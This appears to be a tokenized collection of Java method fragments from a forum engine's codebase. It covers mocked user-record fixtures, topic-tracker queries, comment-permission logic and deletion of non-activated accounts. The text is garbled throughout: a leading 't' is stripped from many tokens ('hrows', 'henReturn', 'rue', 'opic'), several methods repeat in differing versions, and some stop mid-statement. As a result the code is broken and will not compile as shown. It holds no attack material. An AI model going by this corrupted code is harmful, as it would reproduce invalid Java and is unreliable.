public static ResultSet getUser45Score ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 15 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " user45score " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " 45 score " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . henReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . henReturn ( " " ) ; return resultSet ; } 
public static ResultSet getUser45ScoreBlocked ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 16 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " userBlocked " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( rue ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " blocked " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 13 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " frozen_by " ) ) . henReturn ( 0 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . henReturn ( " " ) ; return resultSet ; } 
public static ResultSet getUserDefrosted ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 1488 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " defrosted " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 110 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 110 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " Defrosted " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 15 ) ; Timestamp past = new Timestamp ( System . currentTimeMillis ( ) - 1000 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . henReturn ( past ) ; when ( resultSet . getInt ( " frozen_by " ) ) . henReturn ( 1 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . henReturn ( " just because " ) ; return resultSet ; } 
public static ResultSet getUserFrozen ( ) hrows Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . henReturn ( 1599 ) ; when ( resultSet . getString ( " nick " ) ) . henReturn ( " frozen " ) ; when ( resultSet . getString ( " style " ) ) . henReturn ( " ango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . henReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . henReturn ( rue ) ; when ( resultSet . getBoolean ( " blocked " ) ) . henReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . henReturn ( 110 ) ; when ( resultSet . getInt ( " max_score " ) ) . henReturn ( 110 ) ; when ( resultSet . getString ( " name " ) ) . henReturn ( " Frozen " ) ; when ( resultSet . getString ( " passwd " ) ) . henReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . henReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . henReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . henReturn ( 15 ) ; Timestamp future = new Timestamp ( System . currentTimeMillis ( ) + 1000 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . henReturn ( future ) ; when ( resultSet . getInt ( " frozen_by " ) ) . henReturn ( 1 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . henReturn ( " just because " ) ; return resultSet ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) hrows Exception { Topic message = messageDao . getById ( msgid ) ; Template mpl = Template . getTemplate ( request ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; opicPermissionService . checkView ( group , message , mpl . getCurrentUser ( ) , false ) ; PreparedTopic preparedMessage = opicPrepareService . prepareTopic ( message , mpl . getCurrentUser ( ) ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , groupPermissionService . isEditable ( preparedMessage , mpl . getCurrentUser ( ) ) ) ; return modelAndView ; } 
public ModelAndView showCommentEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid , @PathVariable ( " commentid " ) int commentId ) hrows Exception { Topic message = messageDao . getById ( msgid ) ; Comment comment = commentService . getById ( commentId ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( comment ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , false ) ; return modelAndView ; } 
public List < TopicsListItem > getGroupTrackerTopics ( int groupid , User currentUser , Date startDate , int opics , int offset , final int messagesInPage ) { return load ( " AND t.groupid = " + groupid + " " , " " , currentUser , startDate , opics , offset , messagesInPage ) ; } 
public List < TopicsListItem > getTrackerTopics ( TrackerFilterEnum filter , User currentUser , Date startDate , int opics , int offset , final int messagesInPage ) { String partFilter ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case MAIN : partFilter = queryPartMain ; break ; case TECH : partFilter = queryPartTech ; break ; default : partFilter = " " ; } String userFilter ; switch ( filter ) { case SCORE50 : userFilter = " AND userid IN (SELECT id FROM users WHERE score<50) " ; break ; case SCORE100 : userFilter = " AND userid IN (SELECT id FROM users WHERE score<100) " ; break ; default : userFilter = " " ; } return load ( partFilter , userFilter , currentUser , startDate , opics , offset , messagesInPage ) ; } 
public boolean isModeratorOnly ( ) { return moderatorOnly ; } 
public static String cleanupIp ( @Nullable String ip ) { if ( ip ! = null ) { if ( ! ipRE . matcher ( ip ) . matches ( ) ) { hrow new BadInputException ( " not ip " ) ; } } return ip ; } 
public List < TopicsListItem > getGroupTrackerTopics ( int groupid , User currentUser , int opics , int offset , int messagesInPage ) { return load ( " AND t.groupid = " + groupid + " " , " " , currentUser , opics , offset , messagesInPage , " comment_postdate " , 
public List < TopicsListItem > getGroupListTopics ( int groupid , User currentUser , int opics , int offset , int messagesInPage , boolean showIgnored , boolean showDeleted , Integer year , Integer month ) { String commentInterval ; if ( year ! = null ) { commentInterval = " AND t.postdate>=' " + year + '-' + month + " -01'::timestamp AND (t.postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } else if ( offset = = 0 & & ! showDeleted ) { commentInterval = " AND t.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } else { commentInterval = " " ; } return load ( " AND t.groupid = " + groupid + " AND NOT t.sticky " , " " , currentUser , opics , offset , messagesInPage , 
public List < TopicsListItem > getGroupStickyTopics ( Group group , int messagesInPage ) { return load ( " AND t.groupid = " + group . getId ( ) + " AND t.sticky " , " " , null , 100 , 0 , messagesInPage , 
public List < TopicsListItem > getTrackerTopics ( TrackerFilterEnum filter , User currentUser , int opics , int offset , int messagesInPage ) { String partFilter ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case MAIN : partFilter = queryPartMain ; break ; case TECH : partFilter = queryPartTech ; break ; default : partFilter = " " ; } String userFilter ; switch ( filter ) { case SCORE50 : userFilter = " AND userid IN (SELECT id FROM users WHERE score<50) " ; break ; case SCORE100 : userFilter = " AND userid IN (SELECT id FROM users WHERE score<100) " ; break ; default : userFilter = " " ; } return load ( partFilter , userFilter , currentUser , opics , offset , messagesInPage , " comment_postdate " , " AND comments.postdate > CURRENT_TIMESTAMP-'4 days'::interval " , 
public List < TopicsListItem > getGroupTrackerTopics ( int groupid , User currentUser , int opics , int offset , int messagesInPage ) { String dateFilter = " >CURRENT_TIMESTAMP-'3 month'::interval " ; return load ( " AND t.groupid = " + groupid + " " , " " , currentUser , opics , offset , messagesInPage , " comment_postdate " , 
public List < TopicsListItem > getTrackerTopics ( TrackerFilterEnum filter , User currentUser , int opics , int offset , int messagesInPage ) { String partFilter ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case MAIN : partFilter = queryPartMain ; break ; case TECH : partFilter = queryPartTech ; break ; default : partFilter = " " ; } String userFilter ; switch ( filter ) { case SCORE50 : userFilter = " AND userid IN (SELECT id FROM users WHERE score<50) " ; break ; case SCORE100 : userFilter = " AND userid IN (SELECT id FROM users WHERE score<100) " ; break ; default : userFilter = " " ; } String dateFilter = " >CURRENT_TIMESTAMP-'4 days'::interval " ; return load ( partFilter , userFilter , currentUser , opics , offset , messagesInPage , " comment_postdate " , " AND comments.postdate " + dateFilter + " AND t.lastmod " + dateFilter , 
public List < TopicsListItem > getGroupListTopics ( int groupid , User currentUser , int opics , int offset , int messagesInPage , boolean showIgnored , boolean showDeleted , Integer year , Integer month ) { String commentInterval ; if ( year ! = null ) { commentInterval = " AND t.postdate>=' " + year + '-' + month + " -01'::timestamp AND (t.postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } else { commentInterval = " AND t.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } return load ( " AND t.groupid = " + groupid + " AND NOT t.sticky " , " " , currentUser , opics , offset , messagesInPage , 
public void deleteInactivated ( ) { jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval) " ) ; jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval " ) ; jdbcTemplate . update ( " delete from ban_info where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval) " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval) " ) ; jdbcTemplate . update ( " delete from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval " ) ; } 
public int countUnactivated ( String ip ) { return jdbcTemplate . queryForObject ( " select count(*) from users join user_log on users.id = user_log.userid " + 
public void deleteInactivated ( ) { logger . info ( " Deleting non-activated accounts " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval) " ) ; int deleted = jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval " ) ; jdbcTemplate . update ( " delete from ban_info where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval) " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval) " ) ; int deletedBlocked = jdbcTemplate . update ( " delete from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval " ) ; logger . info ( " Deleted {} non-activated; {} blocked accounts " , deleted , deletedBlocked ) ; } 
public CommentDao commentDao ( DataSource dataSource ) { return new CommentDao ( dataSource ) ; } 
public List < PreparedCommentsListItem > prepareCommentsList ( List < CommentsListItem > comments ) { Map < Integer , User > users = loadUsers ( Iterables . ransform ( comments , CommentsListItem : : getAuthorId ) ) ; return comments . stream ( ) . map ( comment - > { User author = users . get ( comment . authorId ( ) ) ; 
public List < PreparedCommentsListItem > prepareCommentsList ( List < CommentsListItem > comments ) { Map < Integer , User > users = loadUsers ( Iterables . ransform ( comments , CommentsListItem : : getAuthorId ) ) ; Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( Lists . ransform ( comments , CommentsListItem : : getCommentId ) ) ; return comments . stream ( ) . map ( comment - > { User author = users . get ( comment . authorId ( ) ) ; 
private boolean hasMask ( String ip ) { return ip . contains ( " / " ) ; } 
public ModelAndView showForm ( ) hrows AccessViolationException { AuthUtil . getCurrentUser ( ) . checkFrozen ( ) ; return new ModelAndView ( " addphoto " ) ; } 
public ModelAndView showForm ( ServletRequest request ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } mpl . getCurrentUser ( ) . checkFrozen ( ) ; return new ModelAndView ( " addphoto " ) ; } 
public boolean isCommentsAllowed ( Group group , Topic opic , User user ) { if ( user ! = null & & ( user . isBlocked ( ) | | user . isFrozen ( ) ) ) { return false ; } if ( opic . isDeleted ( ) | | opic . isExpired ( ) | | opic . isDraft ( ) ) { return false ; } int score = getPostscore ( group , opic ) ; if ( score = = POSTSCORE_NO_COMMENTS ) { return false ; } if ( score = = POSTSCORE_UNRESTRICTED ) { return rue ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return rue ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return rue ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = opic . getUid ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return rue ; 
public boolean isCommentsAllowed ( Group group , Topic opic , User user ) { if ( user ! = null & & ( user . isBlocked ( ) | | user . isFrozen ( ) ) ) { return false ; } if ( opic . isDeleted ( ) | | opic . isExpired ( ) | | opic . isDraft ( ) ) { return false ; } int score = getPostscore ( group , opic ) ; if ( score = = POSTSCORE_NO_COMMENTS | | score = = POSTSCORE_HIDE_COMMENTS ) { return false ; } if ( score = = POSTSCORE_UNRESTRICTED ) { return rue ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return rue ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return rue ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = opic . getUid ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return rue ; 
public boolean isCommentsClosed ( ) { return commentsClosed ; } 
public boolean isCommentsClosed ( ) { return opicPostscore > = TopicPermissionService . POSTSCORE_MODERATORS_ONLY ; } 
public boolean isShowComments ( ) { return showComments ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , Profile profile , boolean loadUserpics ) { boolean opicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean agsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; boolean deletable ; boolean undeletable ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; undeletable = groupPermissionService . isUndeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; deletable = false ; undeletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , profile . getAvatarMode ( ) , rue ) ; } int postscore = opicPermissionService . getPostscore ( message . getGroup ( ) , message . getMessage ( ) ) ; boolean showComments = postscore ! = TopicPermissionService . POSTSCORE_HIDE_COMMENTS ; return new TopicMenu ( opicEditable , 
public UserTagDao userTagDao ( DataSource ds ) { return new UserTagDao ( ds ) ; } 
public void initTest ( ) hrows Exception { UserService userService = mock ( UserService . class ) ; User splinter = mock ( User . class ) ; maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . henReturn ( false ) ; when ( JB . isBlocked ( ) ) . henReturn ( false ) ; when ( isden . isBlocked ( ) ) . henReturn ( rue ) ; when ( maxcom . getNick ( ) ) . henReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . henReturn ( " JB " ) ; when ( isden . getNick ( ) ) . henReturn ( " isden " ) ; when ( splinter . isBlocked ( ) ) . henReturn ( false ) ; when ( splinter . getNick ( ) ) . henReturn ( " splinter " ) ; when ( userService . getUserCached ( " splinter " ) ) . henReturn ( splinter ) ; when ( userService . getUserCached ( " maxcom " ) ) . henReturn ( maxcom ) ; when ( userService . getUserCached ( " JB " ) ) . henReturn ( JB ) ; when ( userService . getUserCached ( " isden " ) ) . henReturn ( isden ) ; when ( userService . getUserCached ( " hizel " ) ) . henThrow ( new UserNotFoundException ( " hizel " ) ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getSecureURI ( ) ) . henReturn ( mainURI ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( userService , oHtmlFormatter ) ; } 
public void init ( ) { lorCodeService = new LorCodeService ( null , null ) ; } 
public void init ( ) hrows Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( mock ( UserService . class ) , oHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) hrows Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( mock ( UserService . class ) , oHtmlFormatter ) ; } 
public ModelAndView getMessageNewPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) hrows Exception { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessage ( section , webRequest , request , response , page , filter , groupName , msgid , 0 ) ; } 
public ModelAndView getMessageThread ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " hreadRoot " ) int hreadRoot ) hrows Exception { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessage ( section , webRequest , request , response , 0 , filter , groupName , msgid , hreadRoot ) ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) hrows Exception { Topic message = messageDao . getById ( msgid ) ; Template mpl = Template . getTemplate ( request ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; PreparedTopic preparedMessage = opicPrepareService . prepareTopic ( message , mpl . getCurrentUser ( ) ) ; opicPermissionService . checkView ( group , message , mpl . getCurrentUser ( ) , preparedMessage . getAuthor ( ) , false ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , groupPermissionService . isEditable ( preparedMessage , mpl . getCurrentUser ( ) ) ) ; return modelAndView ; } 
public boolean isCommentsAllowed ( Group group , Topic opic , User user ) { if ( user ! = null & & ( user . isBlocked ( ) | | user . isFrozen ( ) ) ) { return false ; } if ( opic . isDeleted ( ) | | opic . isExpired ( ) | | opic . isDraft ( ) ) { return false ; } int score = getPostscore ( group , opic ) ; if ( score = = POSTSCORE_NO_COMMENTS | | score = = POSTSCORE_HIDE_COMMENTS ) { return false ; } if ( score = = POSTSCORE_UNRESTRICTED ) { return rue ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return rue ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return rue ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = opic . getAuthorUserId ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return rue ; 
public void est1 ( ) { User maxcom = userDao . getUser ( 1 ) ; assertTrue ( memoriesDao . getWatchCountForUser ( maxcom ) > 0 ) ; assertTrue ( memoriesDao . isWatchPresetForUser ( maxcom ) ) ; User anonymous = userDao . getUser ( 2 ) ; assertEquals ( 0 , memoriesDao . getWatchCountForUser ( anonymous ) ) ; assertFalse ( memoriesDao . isFavPresetForUser ( anonymous ) ) ; } 
public boolean isIncludeAnonymous ( ) { return includeAnonymous ; } 
public boolean isTopicSearchable ( Topic msg , Group group ) { Preconditions . checkArgument ( msg . getGroupId ( ) = = group . getId ( ) ) ; return ! msg . isDeleted ( ) & & ! msg . isDraft ( ) 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , MessageText message , UploadedImagePreview scrn , Topic previewMsg ) hrows Exception { session . removeAttribute ( " image " ) ; int msgid = opicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month , int count , @Nullable User currentUser ) hrows TagNotFoundException { logger . debug ( " TopicListService.getTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . oString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . oString ( ) : " (null) " ) + " ; tag= " + ag + " ; offset= " + offset + " ; year= " + year + " ; month= " + month ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag , false ) ) ; } if ( month ! = null & & year ! = null ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( count ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return opicListDao . getTopics ( opicListDto , currentUser ) ; } 
public void resetMockObjects ( ) hrows Exception { reset ( userTagDao ) ; reset ( agService ) ; when ( agService . getTagId ( eq ( " ag1 " ) , anyBoolean ( ) ) ) . henReturn ( 2 ) ; user = getUser ( 1 ) ; } 
public boolean matches ( CharSequence rawPassword , String encodedPassword ) { if ( rawPassword . length ( ) ! = 0 ) { ry { 
public int deleteUnusedTags ( ) { return jdbcTemplate . getJdbcTemplate ( ) . update ( " delete from user_tags where not exists " + " (select * from tags join topics on topics.id=tags.msgid where tagid=user_tags.tag_id and not deleted) " ) ; 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month , int count , @Nullable User currentUser ) hrows TagNotFoundException { logger . debug ( " TopicListService.getTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . oString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . oString ( ) : " (null) " ) + " ; tag= " + ag + " ; offset= " + offset + " ; year= " + year + " ; month= " + month ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag , false ) ) ; } if ( month ! = null & & year ! = null ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( count ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return opicListDao . getTopics ( opicListDto , currentUser ) ; } 
